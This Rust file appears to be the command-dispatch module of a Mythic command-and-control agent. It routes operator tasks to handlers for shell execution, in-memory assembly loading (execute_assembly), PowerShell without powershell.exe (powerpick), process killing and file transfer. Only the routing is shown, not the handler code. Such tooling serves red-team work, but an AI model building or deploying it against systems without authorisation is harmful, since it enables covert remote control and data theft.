#[path = "commands/cat.rs"]
mod cat;
#[path = "commands/cd.rs"]
mod cd;
#[path = "commands/cp.rs"]
mod cp;
#[path = "commands/download.rs"]
mod download;
#[path = "commands/env.rs"]
mod env;
#[path = "commands/execute_assembly.rs"]
mod execute_assembly;
#[path = "commands/exit.rs"]
mod exit;
#[path = "commands/kill.rs"]
mod kill;
#[path = "commands/ls.rs"]
mod ls;
#[path = "commands/mkdir.rs"]
mod mkdir;
#[path = "commands/mv.rs"]
mod mv;
#[path = "commands/netstat.rs"]
mod netstat;
#[path = "commands/powerpick.rs"]
mod powerpick;
#[path = "commands/process.rs"]
mod process;
#[path = "commands/ps.rs"]
mod ps;
#[path = "commands/pwd.rs"]
mod pwd;
#[path = "commands/resolve.rs"]
mod resolve;
#[path = "commands/rm.rs"]
mod rm;
#[path = "commands/sleep.rs"]
mod sleep;
#[path = "commands/sysinfo.rs"]
mod sysinfo;
#[path = "commands/upload.rs"]
mod upload;
#[path = "commands/wget.rs"]
mod wget;
#[path = "commands/whoami.rs"]
mod whoami;

use mythic::{TaskMessage, TaskResponse};
use serde::Deserialize;
use uuid::Uuid;

#[derive(Debug, Clone, Deserialize, Default)]
pub struct PostResponseReceipt {
    pub task_id: Uuid,
    #[serde(default)]
    pub status: String,
    #[serde(default)]
    pub file_id: Option<Uuid>,
    #[serde(default)]
    pub error: Option<String>,
    #[serde(default)]
    pub chunk_num: Option<u32>,
    #[serde(default)]
    pub total_chunks: Option<u32>,
    #[serde(default)]
    pub chunk_data: Option<String>,
}

pub fn responses_from_post_response_receipts(
    receipts: &[PostResponseReceipt],
) -> Vec<TaskResponse> {
    let mut out = download::responses_from_receipts(receipts);
    out.extend(upload::responses_from_receipts(receipts));
    out
}

/// Route any command to its handler.
pub fn dispatch(task: &TaskMessage) -> TaskResponse {
    match task.command.as_str() {
        "cat" => cat::handle(task),
        "cd" => cd::handle(task),
        "cp" => cp::handle(task),
        "download" => download::handle(task),
        "env" => env::handle(task),
        "execute" => process::handle_execute(task),
        "execute_assembly" => execute_assembly::handle(task),
        "exit" => exit::handle(task),
        "kill" => kill::handle(task),
        "ls" => ls::handle(task),
        "tree" => ls::handle_tree(task),
        "mkdir" => mkdir::handle(task),
        "mv" => mv::handle(task),
        "netstat" => netstat::handle(task),
        "powerpick" => powerpick::handle(task),
        "ps" => ps::handle(task),
        "pwd" => pwd::handle(task),
        "resolve" => resolve::handle(task),
        "rm" => rm::handle(task),
        "cmd" => process::handle_shell(task, process::ShellKind::Cmd),
        "powershell" => process::handle_shell(task, process::ShellKind::PowerShell),
        "sh" => process::handle_shell(task, process::ShellKind::Sh),
        "bash" => process::handle_shell(task, process::ShellKind::Bash),
        "sleep" => sleep::handle(task),
        "sysinfo" => sysinfo::handle(task),
        "upload" => upload::handle(task),
        "wget" => wget::handle(task),
        "whoami" => whoami::handle(task),
        unknown => TaskResponse::failed(task.id, &format!("unknown command: {unknown}")),
    }
}
